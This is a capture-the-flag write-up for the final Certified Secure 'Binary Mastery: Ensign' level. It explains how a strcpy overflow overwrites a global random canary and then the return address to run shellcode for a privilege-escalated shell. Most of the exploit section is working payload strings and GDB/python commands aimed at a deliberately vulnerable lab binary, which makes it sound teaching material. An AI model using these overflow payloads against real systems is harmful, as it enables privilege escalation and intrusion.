![Logo](/assets/images/belts-blue.png)


In this post we'll continue with level5, the last one from **Certified Secure Binary Mastery**, [Ensign](https://www.certifiedsecure.com/certification/view/37). 
This time we will be dealing again with more buffer overflow issues but we'll have to defeat a homemade implementation of buffer overflow detection. This is the most interesting level so far and it hides yet another logical vulnerability that will allow us to defeat the random stack canary.

To review the previous levels, check the links below:
* [Binary Master: Ensign - Level 1](https://livz.github.io/2016/01/07/binary-master-ensign-1.html)
* [Binary Master: Ensign - Level 2](https://livz.github.io/2016/01/14/binary-master-ensign-2.html)
* [Binary Master: Ensign - Level 3](https://livz.github.io/2016/01/21/binary-master-ensign-3.html)
* [Binary Master: Ensign - Level 4](https://livz.github.io/2016/01/28/binary-master-ensign-4.html)

## 0 - Discovery

Let's connect to the server and check the binary we're dealing with:
```
$ ssh level5@hacking.certifiedsecure.com -p 8266
level4@hacking.certifiedsecure.com's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '16.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      
```

Let's see if we have any mitigation techniques using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally:
```bash
$ checksec.sh --file level5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level5
```

NX is disabled and again there is no stack canary. Why enable the stack cookie when we can do it ourselves, right?. Let's verify whether the stack is executable:

```
$ readelf -lW level5 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

The R**W**E flag suggests Read-**Write**-Execute flags are all enabled. Also remember from the previous levels that ASLR is disabled on the system and all the addresses are static.

## 1 - Vulnerability

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int canary;

void __attribute__ ((constructor)) generate_canary() {
        FILE* fp = fopen("/dev/urandom", "r");
        fread(&canary, 4, 1, fp);                                [1]      
}

void hello(char* name) {
        int cookie = canary;
        int i = 0x12345;
        char* msg = malloc(128);
        char buf[12];

        strcpy(buf, name);                                       [4]
        sprintf(msg, "%s, it's good to see you!\n", buf);        [5]

        printf("%s", msg);

        if (cookie != canary) {                                  [3]        
                printf("*** stack smashing detected ***\n");

                abort();
        }
}

int main(int argc, char** argv) {
        if (argc != 2) {
                printf("Usage: %s <name>\n", argv[0]);

                return -1;
        }

        hello(argv[1]);                                          [2]

        return 0;
}
```

First let us understand how the program works:
* We have one constructor that generates a random 4 bytes canary by reading **/dev/urandom** (**[1]**)
* **Main** function accespts one input parameter which is passed to the **hello** function (**[2]**).
* The **hello** function set its first variable on the stack to the value of the canary. 
* In case any buffer overflow would try to overwrite the return address, it would have to overwrite also the canary. But this will trigger a program termination with an error (**[3]**)

Now let's see how we can break it. Again a stack layout of the function is very useful. We need to understand where each variable is located and what can be overwritten. Below I've renamed the variables in IDA to reflect the source code from level5.c:

![Stack layout](/assets/images/bm5-1.png)

* The **strcpy** call at **[4]** can overwrite the address of the newly allocate memory block in **msg**, which located immediately after the buffer.
* The **sprintf** call at **[5]** will write from **buf** the address overwritten by the call before.
* Basically we have a primitive that allows us to overwrite an arbitrary memory address

## 2 - Exploit

### Overwriting the canary

Because the canary is stored in a global variable, we can overwrite it:

![Global variable](/assets/images/bm5-2.png)

Then we'll supply our overwritten canary value in the buffer and carry on the exploitation as usual. Based on the observation above, a simple payload that just overwrites the canary with 0x01020304 would look like this:
```
| "\x04\x03\x02\x01" | JUNK (8 bytes) | "\x40\xa0\x04\x08" |
```

Explanation:
* At offset 12 in the payload we place the address that will overwrite (at **[4]**) the pointer generated by **malloc**
* First 4 bytes of the payload will be written to that address at **[5]**

We can test this in GDB and make sure we got this first step right:
```bash
gdb-peda$ run  $(python -c 'print "\x04\x03\x02\x01" + "A"*8 + "\x40\xa0\x04\x08"')
```

### Overwriting the return address

Building on the findings from the previous point, the following payload achieves full control of EIP, without triggering the error message:

* Overwrites the canary, as above
* Sends a buffer with the correct overwritten canary value, which will overwrite the **cookie** variable
* Overwrites the return address from **hello** function with "XXXX"

```
| "\x04\x03\x02\x01" | JUNK (8 bytes) | "\x40\xa0\x04\x08" | JUNK (4 bytes) | "\x04\x03\x02\x01" | JUNK (12 bytes) | RET | 
```

If it's not clear why, check again the stack layout from the image above. Basically the 4 bytes of junk represents the **i** variable, nexy we have the value that will overwrite **cookie** (has to be the same as the canary), 12 more junk bytes then the value for the return address.

Again, test this first in GDB:
```bash
gdb-peda$ run  $(python -c 'print "\x04\x03\x02\x01" + "A"*8 + "\x40\xa0\x04\x08" + "JUNK" + "\x01\x02\x03\x04" + 12*"A" + "XXXX"')
```

### Shellcode

In this case we can use the same approach as for levels 1-3 and place a shellcode spawning /bin/dash into an environment variable. Check [level1](https://livz.github.io/2016/01/07/binary-master-ensign-1.html) for more details.

## 3 - Profit

```
$ /levels/level5  $(python -c 'print "\x04\x03\x02\x01" + "A"*8 + "\x40\xa0\x04\x08" + "JUNK" +  "\x04\x03\x02\x01" + 12*"A" + "\xd6\xd8\xff\xff"')
AAAAAAAA@JUNKAAAAAAAAAAAA���, it's good to see you!
$ id
uid=1006(level5) gid=1006(level5) euid=1007(level6) groups=1007(level6),1006(level5)
$ /home/level6/victory
   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      

Subject: Victory!

Congrats, you have solved the last level!. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level5 @ binary mastery ensign)
   * the exploit
```

This was the last level in this challenge set. Next set of levels, [Binary Mastery: Lieutenant](https://www.certifiedsecure.com/certification/view/37) will be even more fun :) as they include modern day vulnerabilities and mitigation techniques!
